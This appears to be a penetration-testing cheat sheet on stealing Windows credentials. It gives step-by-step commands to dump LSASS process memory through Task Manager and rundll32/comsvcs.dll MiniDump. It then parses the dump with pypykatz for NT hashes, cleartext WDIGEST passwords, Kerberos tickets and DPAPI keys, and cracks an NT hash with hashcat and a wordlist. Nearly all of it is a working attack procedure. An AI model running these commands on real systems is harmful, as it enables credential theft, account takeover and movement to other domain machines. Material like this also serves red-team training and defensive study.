## Dumping LSASS process memory
### First method: Task Manager (GUI Only)
1. Open `Task Manager`
2. Select the `Processes` tab
3. Find and right click the `Local Security Authority Process`
4. Select `Create dump file`
A file called `lsass.DMP` is created and saved in `%temp%.

### Second method: Rundll32.exe & Comsvcs.dll
We must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:
```cmd-session
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
===== ====                     === ========
...
lsass.exe                      672 KeyIso, SamSs, VaultSvc
...
```

```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```
#### Creating a dump file using PowerShell
```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

---
## Using Pypykatz to extract credentials

```shell
pypykatz lsa minidump lsass.dmp 
```
### Output
#### MSV
Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory.
#### WDIGEST
LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text.
#### Kerberos
LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
#### DPAPI
These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts.

---
#### Cracking the NT Hash with Hashcat
```shell
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```